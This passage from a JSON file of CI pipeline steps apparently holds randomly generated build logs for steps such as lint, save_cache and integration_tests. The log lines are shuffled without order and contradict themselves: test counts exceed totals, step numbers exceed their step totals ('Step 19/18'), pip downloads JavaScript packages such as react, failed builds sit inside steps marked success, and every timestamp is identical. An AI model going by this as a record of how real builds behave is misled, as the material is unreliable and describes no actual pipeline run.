          "Verifying...",
          "[12:19:14] INFO: Starting build process",
          "Optimizing 55 modules...",
          "[12:19:14] DEBUG: Memory usage: 463MB",
          "Step 16/20: Testing",
          "Switched to branch 'bugfix/task-649'",
          "[12:19:14] INFO: Starting build process",
          "Pulling image: alpine:latest",
          "Loading...",
          "Cache invalidated: node_modules",
          "Connection established",
          "Compiling utils/main.py...",
          "pip: Downloading react-5.10.tar.gz",
          "Pulling image: alpine:18",
          "pip install: Successfully installed express-5.10",
          "Cache restored successfully (173MB)",
          "Pulling image: alpine:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "\u2713 Step 'install' succeeded",
          "pip: Downloading react-1.4.tar.gz",
          "Installing eslint@4.3.5",
          "Transforming 478 files...",
          "Test Suites: 25 passed, 38 total",
          "[12:19:14] WARN: Deprecated API usage",
          "Step 10/22: Testing",
          "Compiling src/index.js...",
          "[12:19:14] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ready.",
          "Minifying vendor.js",
          "Artifact downloaded: 14MB",
          "Building Docker image...",
          "[12:19:14] ERROR: Connection failed",
          "Step 16/22: Linting",
          "[12:19:14] INFO: Request completed",
          "\u2717 build failed with exit code 114",
          "[12:19:14] INFO: Processing request",
          "Cache miss for key-9784",
          "[12:19:14] WARN: Deprecated API usage",
          "npm install: resolved 1660 packages",
          "WARNING: axios has known vulnerabilities",
          "Transforming 850 files...",
          "[12:19:14] INFO: Cache refreshed",
          "\u2717 build failed with exit code 41",
          "  PASS: integration/test_db_connect.spec.js",
          "Success!",
          "[12:19:14] DEBUG: Query executed in 55ms",
          "Fetching submodules...",
          "Environment: development",
          "npm notice: package.json updated",
          "[12:19:14] DEBUG: Loading configuration",
          "[12:19:14] INFO: Connecting to database",
          "NODE_ENV=production",
          "Snapshots: 10 passed, 1 total",
          "\u2713 build completed",
          "\u2717 build failed with exit code 73",
          "  PASS: e2e/test_cache_hit.spec.js",
          "pip: Collecting jest",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "[12:19:14] INFO: Starting build process",
          "Step 11/15: Installing dependencies",
          "Time: 48.345s",
          "Finished.",
          "Compiling components/utils.go...",
          "Loading...",
          "Step 6/23: Running migrations",
          "Test Suites: 9 passed, 50 total",
          "Exception: ValueError",
          "[12:19:14] DEBUG: Memory usage: 1463MB",
          "NODE_ENV=production",
          "Compiling src/index.js...",
          "Checking out develop branch",
          "Fetching submodules...",
          "Tests: 66 passed, 484 total",
          "Building Docker image...",
          "Cache invalidated: build",
          "Compiling src/index.js...",
          "Connection established",
          "GET /api - 204 (40ms)",
          "Environment: test",
          "Completed.",
          "npm install: resolved 641 packages",
          "WARNING: react has known vulnerabilities",
          "[12:19:14] INFO: Processing request",
          "Ran 93 tests in 7s",
          "npm install: resolved 1372 packages",
          "Connection established",
          "pip: Downloading webpack-3.10.tar.gz",
          "Coverage: 94% statements, 70% branches",
          "Step 1/19: Running migrations",
          "Cache restored successfully (369MB)",
          "Coverage: 97% statements, 82% branches",
          "Test Suites: 42 passed, 34 total",
          "Step 5/16: Running migrations",
          "Fetching submodules...",
          "[12:19:14] INFO: Starting build process",
          "Cache saved successfully",
          "Compiling lib/app.ts...",
          "Cache saved successfully",
          "Bundling styles.css",
          "NODE_ENV=production",
          "TLS handshake completed",
          "Cache restored successfully (108MB)",
          "yarn add: Done in 19.56s",
          "Coverage: 84% statements, 64% branches",
          "Platform: linux-x64",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 76% statements, 60% branches",
          "[12:19:14] INFO: Request completed",
          "Cache hit for key-9129",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-16T12:19:25.585377",
        "finished_at": "2025-12-16T12:19:31.997752",
        "log_lines": [
          "=== Step: save_cache ===",
          "Switched to branch 'hotfix/task-877'",
          "GET /health - 201 (90ms)",
          "Installing axios@1.15.9",
          "pip: Downloading jest-3.4.tar.gz",
          "[12:19:14] DEBUG: Loading configuration",
          "Compiling lib/app.ts...",
          "Checking out main branch",
          "Snapshots: 5 passed, 31 total",
          "Step 14/20: Building",
          "Step 5/22: Installing dependencies",
          "Step 16/21: Testing",
          "pip: Installing build dependencies...",
          "Platform: linux-x64",
          "Step 12/22: Building",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "POST /data - 200 (453ms)",
          "[12:19:14] INFO: Cache refreshed",
          "Uploading artifact 'build' (31 files)",
          "Building Docker image...",
          "[12:19:14] WARN: Deprecated API usage",
          "Step 13/15: Installing dependencies",
          "TLS handshake completed",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "[12:19:14] INFO: Starting build process",
          "pip install: Successfully installed webpack-4.11",
          "\u2713 Task completed in 2430ms",
          "Cache invalidated: node_modules",
          "Waiting...",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (6MB)",
          "TLS handshake completed",
          "Tests: 192 passed, 309 total",
          "  PASS: e2e/test_api_health.spec.js",
          "Step 2/17: Linting",
          "npm install: added 212 packages",
          "Compiling components/service.java...",
          "Step 15/25: Installing dependencies",
          "Cache miss for key-1914",
          "Artifact uploaded: dist.zip (24MB)",
          "Verifying...",
          "Completed.",
          "\u2713 build completed",
          "Step 16/17: Linting",
          "Connection established",
          "Checking out master branch",
          "Using Node.js 19.19.6",
          "Layer 5/12: RUN command",
          "HEAD is now at 7560b3d",
          "Using Node.js 20.7.7",
          "Connection established",
          "Pushing to registry...",
          "Step 10/24: Testing",
          "pip: Installing build dependencies...",
          "Tests: 59 passed, 193 total",
          "Optimizing 53 modules...",
          "Environment: test",
          "npm install: added 385 packages",
          "npm install: added 355 packages",
          "npm install: resolved 435 packages",
          "  PASS: test_user_create (66ms)",
          "Step 11/17: Running migrations",
          "Compiling components/service.java...",
          "Tests: 332 passed, 244 total",
          "  PASS: e2e/test_auth_login.spec.js",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (15MB)",
          "Step 19/25: Linting",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "Success!",
          "[12:19:14] DEBUG: Connection pool: 17 active",
          "Loading...",
          "pip: Downloading axios-4.19.tar.gz",
          "Test Suites: 48 passed, 30 total",
          "Compiling src/main.py...",
          "[12:19:14] DEBUG: Query executed in 74ms",
          "Cache restored successfully (282MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 13/23: Running migrations",
          "Pushing to registry...",
          "Minifying app.js",
          "Optimizing 31 modules...",
          "OK",
          "Artifact uploaded: dist.zip (26MB)",
          "POST /api - 201 (222ms)",
          "[12:19:14] DEBUG: Memory usage: 1815MB",
          "npm install: added 396 packages",
          "\u2713 validate completed",
          "[12:19:14] DEBUG: Memory usage: 611MB",
          "npm install: resolved 186 packages",
          "Exception: ValueError",
          "Cache invalidated: node_modules",
          "npm install: resolved 1309 packages",
          "Ran 177 tests in 54s",
          "Step 3/18: Building",
          "Step 13/22: Deploying",
          "npm install: added 216 packages",
          "Step 19/18: Running migrations",
          "TLS handshake completed",
          "Building Docker image...",
          "Step 19/25: Testing",
          "Waiting...",
          "Cache miss for key-5846",
          "TLS handshake completed",
          "[12:19:14] INFO: Cache refreshed",
          "\u2713 Task completed in 321ms",
          "Finished.",
          "[12:19:14] INFO: Starting build process",
          "Minifying vendor.js",
          "Verifying...",
          "npm install: added 318 packages",
          "[12:19:14] INFO: Request completed",
          "Environment: production",
          "WARNING: lodash has known vulnerabilities",
          "pip install: Successfully installed jest-1.3",
          "WARNING: axios has known vulnerabilities",
          "[12:19:14] DEBUG: Memory usage: 1269MB",
          "Building Docker image...",
          "  PASS: unit/test_api_health.spec.js",
          "Using Python 3.10",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (354ms)",
          "\u2713 All checks passed",
          "Completed.",
          "Platform: win32-x64",
          "Finished.",
          "Connecting to test.io:443...",
          "\u2713 Task completed in 2921ms",
          "OK",
          "Ran 94 tests in 9s",
          "Generating source maps...",
          "Minifying app.js",
          "Cache restored successfully (386MB)",
          "Test Suites: 11 passed, 26 total",
          "npm notice: package.json updated",
          "pip install: Successfully installed axios-5.18",
          "Cache restored successfully (206MB)",
          "OK",
          "pip: Collecting eslint",
          "[12:19:14] INFO: Request completed",
          "[12:19:14] DEBUG: Memory usage: 590MB",
          "Ready.",
          "WARNING: eslint has known vulnerabilities",
          "Fetching submodules...",
          "Time: 57.361s",
          "Connecting to cloud.services:443...",
          "POST /data - 202 (198ms)",
          "\u2717 build failed with exit code 19",
          "Exception: ValueError",
          "Completed.",
          "pip: Installing build dependencies...",
          "Snapshots: 41 passed, 35 total",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-16T12:19:31.997752",
        "finished_at": "2025-12-16T12:19:42.685044",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 All checks passed",
          "Using Node.js 15.20.2",
          "Switched to branch 'hotfix/task-126'",
          "Connecting to acme.corp:443...",
          "npm install: added 491 packages",
          "npm install: resolved 1159 packages",
          "Artifact uploaded: dist.zip (89MB)",
          "\u2717 build failed with exit code 112",
          "Ran 47 tests in 15s",
          "Transforming 724 files...",
          "Step 18/21: Testing",
          "[12:19:14] INFO: Starting build process",
          "[12:19:14] INFO: Cache refreshed",
          "Test Suites: 38 passed, 33 total",
          "Creating production build...",
          "Compiling lib/service.java...",
          "Processing...",
          "Layer 6/14: ENV command",
          "Compiling src/handler.rs...",
          "Optimizing 64 modules...",
          "Compiling lib/app.ts...",
          "Exception: TypeError",
          "[12:19:14] INFO: Request completed",
          "TLS handshake completed",
          "\u2713 Step 'test' succeeded",
          "Coverage: 74% statements, 75% branches",
          "Platform: darwin-arm64",
          "yarn add: Done in 6.72s",
          "pip: Installing build dependencies...",
          "\u2713 lint completed",
          "Cache hit for key-3617",
          "Uploading artifact 'dist' (20 files)",
          "OK",
          "Cache hit for key-2892",
          "npm install: added 99 packages",
          "Image pulled successfully",
          "Cache miss for key-8482",
          "\u2713 lint completed",
          "Already up to date.",
          "Pulling image: python:3.11",
          "Step 19/24: Deploying",
          "\u2713 All checks passed",
          "Test Suites: 12 passed, 45 total",
          "pip: Downloading jest-4.4.tar.gz",
          "Ready.",
          "OK",
          "\u2717 build failed with exit code 20",
          "[12:19:14] DEBUG: Query executed in 85ms",
          "Fetching submodules...",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:14] WARN: Deprecated API usage",
          "Cache miss for key-9118",
          "WARNING: jest has known vulnerabilities",
          "Layer 1/13: COPY command",
          "Compiling components/app.ts...",
          "POST /api - 200 (22ms)",
          "[12:19:14] DEBUG: Query executed in 18ms",
          "Waiting...",
          "Success!",
          "\u2717 build failed with exit code 21",
          "pip: Installing build dependencies...",
          "npm install: added 91 packages",
          "\u2713 Task completed in 2364ms",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "\u2713 All checks passed",
          "Installing webpack@3.4.1",
          "pip install: Successfully installed react-5.16",
          "[12:19:14] DEBUG: Connection pool: 14 active",
          "[12:19:14] DEBUG: Connection pool: 1 active",
          "Transforming 884 files...",
          "Checking out develop branch",
          "Snapshots: 44 passed, 18 total",
          "pip install: Successfully installed webpack-5.19",
          "npm notice: package.json updated",
          "Waiting...",
          "Bundling main.css",
          "Creating production build...",
          "Step 2/21: Testing",
          "Verifying...",
          "[12:19:14] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Cache restored successfully (95MB)",
          "Using Node.js 14.2.6",
          "Cache hit for key-9534",
          "Step 20/23: Linting",
          "  PASS: test_db_connect (80ms)",
          "Snapshots: 28 passed, 23 total",
          "[12:19:14] INFO: Cache refreshed",
          "\u2713 Task completed in 4255ms",
          "Success!",
          "Installing axios@1.8.9",
          "Checking out develop branch",
          "Time: 38.794s",
          "[12:19:14] INFO: Request completed",
          "pip: Downloading jest-1.19.tar.gz",
          "Transforming 632 files...",
          "Compiling lib/app.ts...",
          "Compiling lib/handler.rs...",
          "Tests: 227 passed, 96 total",
          "pip install: Successfully installed axios-3.1",
          "OK",
          "NODE_ENV=development",
          "  PASS: test_cache_hit (70ms)",
          "Checking out main branch",
          "Checking out master branch",
          "Compiling lib/main.py...",
          "Cache saved successfully",
          "Finished.",
          "[12:19:14] DEBUG: Memory usage: 1125MB",
          "Switched to branch 'feature/task-264'",
          "Artifact uploaded: dist.zip (97MB)",
          "Optimizing 26 modules...",
          "Connection established",
          "[12:19:14] INFO: Request completed",
          "pip install: Successfully installed express-3.18",
          "[12:19:14] DEBUG: Loading configuration",
          "Environment: test",
          "HEAD is now at 1a732cc",
          "OK",
          "npm install: added 355 packages",
          "\u2713 Task completed in 1387ms",
          "Compiling lib/service.java...",
          "Using Node.js 14.19.7",
          "Verifying...",
          "Building Docker image...",
          "[12:19:14] DEBUG: Connection pool: 12 active",
          "Cache miss for key-4406",
          "Creating production build...",
          "Minifying main.js",
          "Compiling lib/utils.go...",
          "Transforming 982 files...",
          "\u2713 Step 'setup' succeeded",
          "Finished.",
          "Step 5/22: Linting",
          "Test Suites: 28 passed, 33 total",
          "Transforming 962 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "\u2713 Task completed in 2022ms",
          "[12:19:14] WARN: Deprecated API usage",
          "pip install: Successfully installed react-5.20",
          "Checking out main branch",
          "Using Python 3.11",
          "Cache invalidated: dependencies",
          "Completed.",
          "Installing express@1.4.0",
          "[12:19:14] INFO: Starting build process",
          "Time: 28.488s",
          "[12:19:14] DEBUG: Initializing service",
          "Ready.",
          "Layer 8/14: RUN command",
          "Compiling utils/handler.rs...",
          "Waiting...",
          "Image pulled successfully",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-16T12:19:42.685044",
        "finished_at": "2025-12-16T12:19:53.372336",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "pip: Collecting lodash",
          "Already up to date.",
          "Artifact downloaded: 19MB",
          "Success!",
          "pip: Downloading react-1.0.tar.gz",
          "Generating source maps...",
          "Cache saved successfully",
          "Step 16/24: Installing dependencies",
          "[12:19:14] DEBUG: Connection pool: 1 active",
          "Processing...",
          "Compiling utils/index.js...",
          "Verifying...",
          "Time: 40.25s",
          "pip: Collecting eslint",
          "Image pulled successfully",
          "Cache invalidated: dependencies",
          "Checking out master branch",
          "Optimizing 97 modules...",
          "Coverage: 100% statements, 87% branches",
          "\u2713 Step 'checkout' succeeded",
          "Loading...",
          "pip: Installing build dependencies...",
          "Loading...",
          "\u2713 build completed",
          "[12:19:14] INFO: Connecting to database",
          "Optimizing 66 modules...",
          "TLS handshake completed",
          "Fetching submodules...",
          "[12:19:14] INFO: Connecting to database",
          "Checking out master branch",
          "Generating source maps...",
          "Creating production build...",
          "Processing...",
          "[12:19:14] WARN: Deprecated API usage",
          "Pulling image: alpine:latest",
          "Coverage: 92% statements, 74% branches",
          "npm notice: created a lockfile",
          "Step 16/21: Installing dependencies",
          "[12:19:14] ERROR: Connection failed",
          "Cache miss for key-6652",
          "Test Suites: 27 passed, 49 total",
          "Loading...",
          "Processing...",
          "Tests: 380 passed, 52 total",
          "[12:19:14] DEBUG: Connection pool: 19 active",
          "TLS handshake completed",
          "Building Docker image...",
          "Compiling lib/utils.go...",
          "Compiling lib/service.java...",
          "[12:19:14] INFO: Starting build process",
          "Connection established",
          "Platform: win32-x64",
          "Step 13/24: Testing",
          "Waiting...",
          "[12:19:14] INFO: Processing request",
          "pip install: Successfully installed lodash-2.0",
          "[12:19:14] INFO: Request completed",
          "\u2713 Task completed in 346ms",
          "Time: 48.538s",
          "[12:19:14] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "pip install: Successfully installed express-3.11",
          "Step 20/16: Testing",
          "Test Suites: 45 passed, 45 total",
          "Snapshots: 46 passed, 14 total",
          "Layer 4/9: ENV command",
          "npm install: added 159 packages",
          "npm notice: package.json updated",
          "Compiling src/app.ts...",
          "Cache restored successfully (211MB)",
          "Step 1/22: Building",
          "pip: Downloading axios-2.12.tar.gz",
          "pip: Collecting express",
          "Installing express@4.19.5",
          "Processing...",
          "npm install: added 32 packages",
          "Waiting...",
          "Verifying...",
          "Cache saved successfully",
          "Ready.",
          "pip: Downloading eslint-5.16.tar.gz",
          "\u2713 All checks passed",
          "Compiling src/handler.rs...",
          "Verifying...",
          "[12:19:14] DEBUG: Loading configuration",
          "Loading...",
          "Artifact downloaded: 50MB",
          "WARNING: react has known vulnerabilities",
          "HEAD is now at d2d37fb",
          "\u2713 Step 'install' succeeded",
          "[12:19:14] INFO: Cache refreshed",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /api - 201 (412ms)",
          "Step 3/16: Installing dependencies",
          "Loading...",
          "Step 8/17: Running migrations",
          "[12:19:14] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Waiting...",
          "Compiling src/handler.rs...",
          "Step 4/18: Linting",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Building Docker image...",
          "NODE_ENV=development",
          "npm install: added 73 packages",
          "Installing prettier@3.14.5",
          "Step 9/25: Testing",
          "\u2713 Step 'checkout' succeeded",
          "Pushing to registry...",
          "Cache restored successfully (158MB)",
          "[12:19:14] DEBUG: Initializing service",
          "Bundling runtime.js",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "Step 11/15: Testing",
          "Compiling utils/handler.rs...",
          "Uploading artifact 'build' (34 files)",
          "Compiling utils/index.js...",
          "[12:19:14] DEBUG: Loading configuration",
          "Environment: test",
          "Tests: 425 passed, 219 total",
          "Cache miss for key-1898",
          "Switched to branch 'hotfix/task-728'",
          "Cache restored successfully (59MB)",
          "Cache restored successfully (262MB)",
          "GET /api - 204 (50ms)",
          "HEAD is now at 2e032ab",
          "Minifying vendor.js",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:19:14] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-692'",
          "[12:19:14] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "[12:19:14] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:19:14] DEBUG: Loading configuration",
          "Finished.",
          "Cache hit for key-9769",
          "Uploading artifact 'dist' (8 files)",
          "POST /upload - 201 (387ms)",
          "Cache hit for key-2918",
          "Minifying app.js",
          "Step 13/18: Installing dependencies",
          "Installing webpack@3.14.6",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Connection established",
          "Processing...",
          "pip: Collecting express",
          "NODE_ENV=development",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-16T12:19:53.372336",
        "finished_at": "2025-12-16T12:20:04.059628",
        "log_lines": [
          "=== Step: setup_node ===",
          "Connection established",
          "Artifact downloaded: 13MB",
          "Step 1/23: Linting",
          "Artifact uploaded: build.tar.gz (13MB)",
          "WARNING: jest has known vulnerabilities",
          "Connecting to cloud.services:443...",
          "Step 16/17: Deploying",
          "Compiling lib/index.js...",
          "Test Suites: 28 passed, 48 total",
          "Ran 44 tests in 28s",
          "Loading...",
          "Completed.",
          "[12:19:14] WARN: Deprecated API usage",
          "[12:19:14] WARN: Deprecated API usage",
          "[12:19:14] INFO: Processing request",
          "[12:19:14] INFO: Request completed",
          "[12:19:14] INFO: Starting build process",
          "Waiting...",
          "[12:19:14] DEBUG: Query executed in 71ms",
          "Tests: 350 passed, 148 total",
          "Ready.",
          "[12:19:14] INFO: Cache refreshed",
          "Layer 6/12: ENV command",
          "pip: Collecting jest",
          "pip install: Successfully installed express-4.14",
          "Loading...",
          "POST /data - 200 (47ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:14] INFO: Request completed",
          "Connection established",
          "npm install: resolved 1888 packages",
          "Cache miss for key-6238",
          "Finished.",
          "Snapshots: 46 passed, 39 total",
          "Switched to branch 'feature/task-153'",
          "[12:19:14] DEBUG: Query executed in 77ms",
          "Step 17/23: Installing dependencies",
          "Cache hit for key-6428",
          "Fetching submodules...",
          "[12:19:14] DEBUG: Connection pool: 20 active",
          "Platform: linux-x64",
          "Generating source maps...",
          "Layer 2/15: COPY command",
          "Cache miss for key-8806",
          "OK",
          "[12:19:14] INFO: Cache refreshed",
          "Step 18/15: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Fetching submodules...",
          "[12:19:14] DEBUG: Initializing service",
          "Verifying...",
          "Layer 1/11: ENV command",
          "npm notice: created a lockfile",
          "[12:19:14] DEBUG: Query executed in 27ms",
          "Step 11/18: Building",
          "Verifying...",
          "Ready.",
          "\u2713 All checks passed",
          "Pulling image: alpine:3.11",
          "Finished.",
          "[12:19:14] DEBUG: Initializing service",
          "Bundling vendor.css",
          "pip: Downloading webpack-4.18.tar.gz",
          "Fetching submodules...",
          "Generating source maps...",
          "Pushing to registry...",
          "Cache hit for key-2048",
          "Waiting...",
          "[12:19:14] WARN: Deprecated API usage",
          "Tests: 285 passed, 400 total",
          "[12:19:14] INFO: Processing request",
          "[12:19:14] INFO: Cache refreshed",
          "Image pulled successfully",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "POST /data - 202 (134ms)",
          "yarn add: Done in 17.44s",
          "Step 9/17: Installing dependencies",
          "HEAD is now at f3a02f2",
          "\u2713 package completed",
          "Environment: production",
          "Snapshots: 12 passed, 7 total",
          "Step 15/23: Linting",
          "OK",
          "Finished.",
          "\u2713 All checks passed",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:14] INFO: Processing request",
          "npm notice: package.json updated",
          "Ready.",
          "Generating source maps...",
          "Installing prettier@5.5.6",
          "pip: Downloading express-2.13.tar.gz",
          "Building Docker image...",
          "Compiling components/index.js...",
          "Artifact downloaded: 14MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Exception: ValueError",
          "  PASS: test_user_create (381ms)",
          "Minifying main.js",
          "Cache hit for key-6153",
          "Image pulled successfully",
          "Already up to date.",
          "POST /api - 201 (218ms)",
          "pip: Installing build dependencies...",
          "Test Suites: 36 passed, 22 total",
          "Snapshots: 21 passed, 38 total",
          "Time: 65.705s",
          "Installing prettier@5.8.1",
          "Cache restored successfully (444MB)",
          "HEAD is now at decb410",
          "Image pulled successfully",
          "[12:19:14] INFO: Request completed",
          "Waiting...",
          "[12:19:14] WARN: Deprecated API usage",
          "Using Python 3.11",
          "Completed.",
          "Artifact uploaded: dist.zip (27MB)",
          "npm notice: package.json updated",
          "\u2713 Step 'build' succeeded",
          "Coverage: 99% statements, 66% branches",
          "Coverage: 89% statements, 78% branches",
          "npm notice: package.json updated",
          "Using Node.js 15.9.2",
          "Finished.",
          "\u2717 build failed with exit code 12",
          "npm notice: package.json updated",
          "pip install: Successfully installed prettier-1.7",
          "npm install: resolved 180 packages",
          "pip: Collecting react",
          "\u2717 build failed with exit code 13",
          "Generating source maps...",
          "[12:19:14] INFO: Starting build process",
          "Building Docker image...",
          "Layer 6/15: ENV command",
          "Artifact uploaded: dist.zip (54MB)",
          "NODE_ENV=production",
          "Artifact downloaded: 46MB",
          "Optimizing 31 modules...",
          "Switched to branch 'bugfix/task-721'",
          "HEAD is now at b7d8f13",
          "Waiting...",
          "Artifact downloaded: 19MB",
          "Layer 5/9: COPY command",
          "[12:19:14] WARN: Deprecated API usage",
          "  PASS: test_db_connect (40ms)",
          "Cache hit for key-2448",
          "Pushing to registry...",
          "FAILED: test_db_connect",
          "[12:19:14] INFO: Connecting to database",
          "Environment: staging",
          "npm install: resolved 1239 packages",
          "Exception: RuntimeError",
          "Installing webpack@5.1.8",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-16T12:20:04.059628",
        "finished_at": "2025-12-16T12:20:25.434211",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Loading...",
          "Done.",
          "Platform: linux-x64",
          "\u2713 Task completed in 2710ms",
          "Step 14/24: Building",
          "[12:19:14] INFO: Request completed",
          "[12:19:14] DEBUG: Initializing service",
          "Optimizing 59 modules...",
          "Artifact uploaded: dist.zip (26MB)",
          "Artifact downloaded: 30MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Processing...",
          "[12:19:14] DEBUG: Connection pool: 3 active",
          "FAILED: test_api_health",
          "Bundling styles.js",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Optimizing 20 modules...",
          "yarn add: Done in 22.23s",
          "Snapshots: 11 passed, 48 total",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Step 15/21: Linting",
          "Cache saved successfully",
          "Uploading artifact 'build' (10 files)",
          "[12:19:14] WARN: Deprecated API usage",
          "Ran 122 tests in 50s",
          "Processing...",
          "Step 5/17: Running migrations",
          "\u2713 test completed",
          "Minifying app.js",
          "[12:19:14] INFO: Starting build process",
          "pip: Downloading axios-1.12.tar.gz",
          "Step 8/15: Building",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Done.",
          "[12:19:14] DEBUG: Connection pool: 6 active",
          "  PASS: test_api_health (69ms)",
          "Artifact uploaded: dist.zip (76MB)",
          "Step 11/15: Building",
          "Switched to branch 'feature/task-285'",
          "Platform: darwin-arm64",
          "Time: 91.911s",
          "FAILED: test_user_create",
          "WARNING: jest has known vulnerabilities",
          "Pushing to registry...",
          "Step 6/16: Linting",
          "npm install: resolved 434 packages",
          "Finished.",
          "pip: Downloading webpack-2.2.tar.gz",
          "Processing...",
          "\u2713 deploy completed",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "NODE_ENV=production",
          "Cache invalidated: build",
          "Loading...",
          "pip: Collecting jest",
          "pip install: Successfully installed axios-1.7",
          "Compiling lib/service.java...",
          "Building Docker image...",
          "GET /health - 201 (7ms)",
          "[12:19:14] INFO: Request completed",
          "Success!",
          "Processing...",
          "Ran 160 tests in 12s",
          "Tests: 465 passed, 347 total",
          "FAILED: test_auth_login",
          "Image pulled successfully",
          "Artifact downloaded: 40MB",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (23MB)",
          "Waiting...",
          "Ready.",
          "  PASS: test_auth_login (33ms)",
          "Connection established",
          "Done.",
          "Layer 9/15: COPY command",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/21: Running migrations",
          "Verifying...",
          "Pulling image: node:3.11",
          "NODE_ENV=development",
          "Step 5/17: Deploying",
          "Step 5/18: Deploying",
          "pip: Installing build dependencies...",
          "Cache hit for key-3596",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "[12:19:14] INFO: Cache refreshed",
          "Step 8/22: Running migrations",
          "Layer 5/10: ENV command",
          "pip: Downloading express-3.3.tar.gz",
          "Loading...",
          "\u2713 All checks passed",
          "Loading...",
          "Creating production build...",
          "Exception: NullPointerException",
          "[12:19:14] WARN: Deprecated API usage",
          "Environment: staging",
          "Building Docker image...",
          "Waiting...",
          "[12:19:14] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "Layer 8/10: COPY command",
          "Finished.",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "[12:19:14] DEBUG: Query executed in 45ms",
          "Step 19/17: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Step 4/19: Deploying",
          "Step 17/23: Testing",
          "\u2713 Task completed in 2525ms",
          "Coverage: 92% statements, 67% branches",
          "[12:19:14] DEBUG: Memory usage: 667MB",
          "Time: 39.878s",
          "[12:19:14] DEBUG: Initializing service",
          "[12:19:14] DEBUG: Memory usage: 142MB",
          "Cache saved successfully",
          "Time: 69.848s",
          "Done.",
          "\u2713 Step 'test' succeeded",
          "Completed.",
          "\u2713 validate completed",
          "[12:19:14] INFO: Cache refreshed",
          "Cache invalidated: node_modules",
          "pip: Collecting webpack",
          "Exception: TypeError",
          "POST /data - 202 (181ms)",
          "Coverage: 95% statements, 100% branches",
          "GET /health - 204 (54ms)",
          "Optimizing 75 modules...",
          "npm install: added 113 packages",
          "[12:19:14] DEBUG: Loading configuration",
          "Completed.",
          "Artifact downloaded: 23MB",
          "Installing express@5.19.9",
          "\u2713 All checks passed",
          "pip install: Successfully installed jest-1.1",
          "[12:19:14] INFO: Starting build process",
          "Finished.",
          "\u2713 Task completed in 4991ms",
          "Step 10/25: Running migrations",
          "Ran 115 tests in 54s",
          "Ran 168 tests in 37s",
          "NODE_ENV=production",
          "Compiling lib/index.js...",
          "Waiting...",
          "Pulling image: alpine:18",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-16T12:20:25.434211",
        "finished_at": "2025-12-16T12:20:29.709128",
        "log_lines": [
          "=== Step: checkout ===",
          "Using Node.js 18.10.10",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "pip: Downloading jest-3.11.tar.gz",
          "Step 20/17: Testing",
          "npm install: added 352 packages",
          "Done.",
          "Layer 2/13: RUN command",
          "[12:19:14] INFO: Cache refreshed",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
